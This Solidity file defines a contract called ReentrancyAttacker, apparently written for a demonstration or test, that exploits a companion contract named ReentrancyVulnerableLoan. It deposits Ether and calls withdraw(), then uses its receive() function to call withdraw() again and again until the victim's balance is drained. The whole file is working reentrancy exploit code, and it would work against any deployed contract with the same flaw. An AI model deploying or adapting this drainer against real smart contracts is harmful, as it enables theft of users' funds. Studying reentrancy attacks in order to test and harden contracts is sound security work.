// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "./ReentrancyVulnerableLoan.sol";

/// @title ReentrancyAttacker
/// @notice A malicious contract designed to exploit the ReentrancyVulnerableLoan contract.
/// @dev Uses a fallback function to recursively call withdraw().
contract ReentrancyAttacker {
    ReentrancyVulnerableLoan public immutable victim;

    constructor(address victimAddress) {
        victim = ReentrancyVulnerableLoan(victimAddress);
    }

    /// @notice Initiates the attack by depositing funds and immediately withdrawing them.
    function attack() external payable {
        victim.deposit{value: msg.value}();
        victim.withdraw();
    }

    /// @notice Fallback function triggered when the victim contract sends Ether.
    /// @dev Recursively calls withdraw() before the victim can update its balance state.
    receive() external payable {
        if (address(victim).balance > 0) {
            victim.withdraw();
        }
    }
}
